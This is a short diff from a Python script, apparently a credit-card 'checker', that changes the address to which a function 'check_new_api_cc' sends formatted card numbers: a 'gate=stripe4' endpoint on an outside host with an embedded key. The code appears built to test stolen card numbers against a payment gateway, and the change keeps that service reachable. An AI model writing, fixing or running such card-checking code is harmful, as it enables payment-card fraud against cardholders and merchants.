@@ -521,7 +521,7 @@ def check_new_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://darkwaslost-sp-api.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
+                f"https://darkwaslost-sp-api-bjo9.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
